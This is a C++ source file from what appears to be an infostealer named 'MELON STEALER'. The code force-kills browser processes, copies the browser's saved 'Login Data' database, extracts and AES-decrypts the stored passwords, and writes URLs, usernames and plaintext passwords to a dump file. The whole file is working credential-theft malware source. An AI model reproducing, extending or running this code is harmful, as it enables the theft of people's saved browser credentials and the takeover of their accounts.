#include "../includes.h"

void kill_browser(const std::vector<std::string>& browser_process) {
    for (const auto& process : browser_process) {
        try
        {
            std::string browser_kill = "taskkill /F /IM " + process;
            system(browser_kill.c_str());
        }
        catch (const std::exception& e)
        {
            logger::log(logger::error, "Could not kill browser, %s", e.what());
        }

    }
}

void steal_db(std::string path) {
    try
    {
        if (std::filesystem::exists(definitions::browser + "Default\\Login Data.db")) {
            std::filesystem::remove(definitions::browser + "Default\\Login Data.db");
            logger::log(logger::success, "Cleaned up leftovers.");
        }
        std::filesystem::copy_file(path, path + ".db");
    }
    catch (const std::exception& e)
    {
        logger::log(logger::error, "Some error occured while stealing DB. %s", e.what());
    }
}

void retrieve_DB(const std::string& dbname, const std::string& query, const std::vector<BYTE>& aeskey) {

    try {
        sqlite3pp::database db(dbname.c_str());
        sqlite3pp::query qry(db, query.c_str());

        std::fstream dumpedDB;
        dumpedDB.open("dumpedDB.txt", std::ios::out | std::ios::trunc);
        for (auto i = qry.begin(); i != qry.end(); ++i) {
            std::string origin_url = (*i).get<std::string>(0);
            std::string username_value = (*i).get<std::string>(1);

            const void* encrypted_password_data = (*i).get<const void*>(2);
            int encrypted_password_data_size = (*i).column_bytes(2);
            std::vector<unsigned char> blob_vec(reinterpret_cast<const unsigned char*>(encrypted_password_data),
                reinterpret_cast<const unsigned char*>(encrypted_password_data) + encrypted_password_data_size);

            // Extract IV (bytes 3-15) and encrypted password (bytes 15 to end minus last 16 bytes)
            std::vector<unsigned char> iv(blob_vec.begin() + 3, blob_vec.begin() + 15);
            std::vector<unsigned char> encrypted_password(blob_vec.begin() + 15, blob_vec.end());

            // Decrypt the password
            std::vector<unsigned char> decrypted_password = decrypt_utils::decryptAES(encrypted_password, aeskey, iv);

            // Convert decrypted data to string
            std::string password_str(decrypted_password.begin(), decrypted_password.end());

            if (!dumpedDB.is_open()) {
                logger::log(logger::error, "File cant be opened");
            }
            dumpedDB << "URL: " << origin_url << "\n" << "Username: " << username_value << "\n" << "Password: " << password_str << "\n" << "\n ---MELON STEALER--- \n";

            logger::log(logger::success, "Successfully Decrypted and retrieved DB.");
        }
        dumpedDB.close();
    }
    catch (const std::exception& e) {
        logger::log(logger::error, "An error occurred while querying the database:, %s", e.what());
    }
}